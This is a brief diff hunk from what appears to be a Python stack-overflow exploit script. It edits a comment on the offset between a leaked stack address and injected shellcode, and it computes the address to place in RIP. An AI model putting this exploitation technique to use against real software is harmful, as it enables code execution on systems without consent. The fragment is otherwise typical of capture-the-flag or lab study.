@@ -39,7 +39,7 @@ print(str(victim.recvline(), "latin-1"))
 print(str(victim.recvline(), "latin-1"))
 print(str(victim.recvline(), "latin-1"))
 
-#by looking at our prints we can see shell at top of stack is +10 
+#by looking at our prints we can see shell at top of stack is +0x20
 #from our memory leak we want to put this in rip for the return
 shellcodeplace = leak_int + 0x20
 
